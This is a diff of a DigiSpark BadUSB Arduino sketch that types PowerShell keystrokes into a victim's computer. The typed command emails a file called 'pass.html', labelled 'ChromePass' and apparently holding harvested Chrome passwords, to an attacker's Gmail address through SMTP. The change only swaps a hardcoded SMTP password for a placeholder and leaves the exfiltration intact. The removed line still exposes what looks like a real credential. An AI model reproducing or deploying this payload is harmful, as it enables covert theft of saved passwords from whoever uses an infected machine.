@@ -27,7 +27,7 @@ void setup() {
   DigiKeyboard.delay(300);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(300);
-  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('clash13of9clans@gmail.com', 'fookyuoo123456'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'clash13of9clans@gmail.com'; $ReportEmail.To.Add('clash11of8clans@gmail.com'); $ReportEmail.Subject = 'DigiSpark - User: ' + $env:username; $ReportEmail.Body = 'ChromePass'; $ReportEmail.Attachments.Add('pass.html'); $SMTPInfo.Send($ReportEmail);"));
+  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('clash13of9clans@gmail.com', 'hhhhhhhhhhhh'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'clash13of9clans@gmail.com'; $ReportEmail.To.Add('clash11of8clans@gmail.com'); $ReportEmail.Subject = 'DigiSpark - User: ' + $env:username; $ReportEmail.Body = 'ChromePass'; $ReportEmail.Attachments.Add('pass.html'); $SMTPInfo.Send($ReportEmail);"));
   DigiKeyboard.delay(1000);
   DigiKeyboard.print(F("exit"));
   DigiKeyboard.delay(100);
